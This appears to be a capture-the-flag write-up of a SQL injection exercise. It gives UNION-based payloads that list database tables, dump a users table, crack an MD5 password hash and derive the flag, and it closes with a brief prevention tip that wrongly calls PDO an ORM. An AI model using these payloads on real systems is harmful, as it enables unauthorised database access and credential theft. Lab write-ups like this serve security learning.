@@ -1,0 +1,40 @@
+Injection sql search members :
+If we submit nothing we see an SQL error, so we know it's not well protected.
+so we try :
+
+1 or 1 = 1 
+-> and we get 4 profiles with their first names and surname
+
+One of them is GetThe Flag (surname first name);
+so we need to get more information, first we get all tables name and colmums name with :
+
+1 or 1=1 UNION select table_name, column_name FROM information_schema.columns
+-> we can see a table named users, with severals columns : user_id, first_name, last_name, town, country, planet, Commentaire, countersign
+
+First try :
+1 or 1=1 UNION SELECT town, country  FROM users
+First name: 42
+Surname : 42
+
+Second try :
+1 UNION select planet, Commentaire from users
+ID: 1 UNION select planet, Commentaire from users 
+First name: 42
+Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+-> this surname is interesting, let's see the last column of users
+
+1 UNION select countersign, Commentaire from users
+ID: 1 UNION select countersign, Commentaire from users 
+First name: 5ff9d0165b4f92b14994e5c685cdce28
+Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+
+md5 ( 5ff9d0165b4f92b14994e5c685cdce28 ) = FortyTwo
+
+Sh256 ( fortytwo ) = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+This is our FLag !
+
+
+This can be used to extract data form DB. 
+
+To prevent you can use an Object Relation Mapping ORM like PDO in PHP.
